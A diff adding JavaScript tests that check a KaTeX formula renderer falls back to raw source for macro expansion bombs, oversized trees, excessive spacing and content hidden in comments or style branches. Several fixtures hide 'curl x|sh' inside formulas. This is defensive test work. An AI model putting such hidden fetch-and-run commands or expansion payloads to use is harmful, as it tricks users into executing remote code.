@@ -147,6 +147,70 @@ test('oversized, hidden, overlapping, negatively spaced and custom-painted formu
   assert.match(parse(String.raw`$\sqrt{x}+\frac{1}{2}$`), /class="katex"/);
 });
 
+test('macro definitions stay visible and the amplification payload returns in under 50 ms', t => {
+  const source = '$' + String.raw`\def\b{` + 'x'.repeat(500) + String.raw`}\def\a{` + String.raw`\b`.repeat(400) + String.raw`}\a$`;
+  const start = performance.now();
+  const rendered = parse(source);
+  const elapsed = performance.now() - start;
+  t.diagnostic('Macro amplification fallback: ' + elapsed.toFixed(2) + ' ms.');
+  assert.ok(elapsed < 50, 'elapsed: ' + elapsed);
+  assert.ok(rendered.includes('<code>' + source + '</code>'));
+
+  const definitions = [
+    String.raw`\def\a{x}`, String.raw`\gdef\a{x}`, String.raw`\edef\a{x}`, String.raw`\xdef\a{x}`,
+    String.raw`\let\a=x`, String.raw`\futurelet\a x`, String.raw`\newcommand{\a}{x}`,
+    String.raw`\renewcommand{\sin}{x}`, String.raw`\providecommand{\a}{x}`,
+  ];
+  for (const definition of definitions) {
+    const formula = '$' + definition + ' + 1$';
+    assert.ok(parse(formula).includes('<code>' + formula + '</code>'), definition);
+  }
+});
+
+test('the tree ceiling stops rendering and both KaTeX calls have a small expansion budget', async t => {
+  const { default: katex } = await import('katex');
+  const inspect = katex.__parse;
+  const render = katex.renderToString;
+  const inspectMock = t.mock.method(katex, '__parse', (text, options) => {
+    if (text === 's_{472918}') {
+      return [{ type: 'ordgroup', body: Array.from({ length: 4000 }, () => ({ type: 'mathord', text: 'x' })) }];
+    }
+    return inspect(text, options);
+  });
+  const renderMock = t.mock.method(katex, 'renderToString', render);
+  assert.match(parse('$s_{472918}$'), /<code>\$s_\{472918\}\$<\/code>/);
+  assert.equal(renderMock.mock.callCount(), 0);
+  assert.match(parse('$s_{472919}$'), /class="katex"/);
+  for (const { arguments: [, options] } of [...inspectMock.mock.calls, ...renderMock.mock.calls]) {
+    assert.equal(options.maxExpand, 50);
+    assert.equal(options.macros, undefined);
+    assert.equal(options.globalGroup, undefined);
+  }
+});
+
+test('comments and alternate style branches show everything Copy and Quote would keep', () => {
+  const hidden = [
+    String.raw`$\text{ls}%;curl x|sh;$`, String.raw`$\text{ls}\\%;curl x|sh;$`,
+    String.raw`$\text{ls}\mathchoice{}{}{}{;curl x|sh;}$`,
+    String.raw`$\TextOrMath{;curl x|sh;}{\text{ls}}$`,
+    String.raw`$\html@mathml{\text{ls}}{;curl x|sh;}$`,
+    String.raw`$\@firstoftwo{\text{ls}}{;curl x|sh;}$`,
+  ];
+  for (const source of hidden) assert.ok(parse(source).includes('<code>' + source + '</code>'), source);
+  for (const source of [String.raw`$\text{100\%}$`, String.raw`$\verb|100%|$`, String.raw`$a\pmod{n}$`]) assert.match(parse(source), /class="katex"/);
+});
+
+test('summed positive kerns and spaces fall back before they can push text out of view', () => {
+  for (const [command, count] of [
+    [String.raw`\kern9em `, 100], [String.raw`\quad `, 400], [String.raw`\qquad `, 11],
+    [String.raw`\mkern18mu `, 21], [String.raw`\kern9em `, 3], ['~', 65],
+  ]) {
+    const source = '$' + command.repeat(count) + 'x$';
+    assert.ok(parse(source).includes('<code>' + source + '</code>'), command);
+  }
+  assert.match(parse(String.raw`$a\kern9em\kern9em\quad b$`), /class="katex"/);
+});
+
 test('limits formula source bytes and the count and HTML bytes of each reply', () => {
   const unicode = '$' + String.raw`\text{` + '汉'.repeat(700) + '}$';
   assert.ok(parse(unicode).includes('<code>' + unicode + '</code>'));
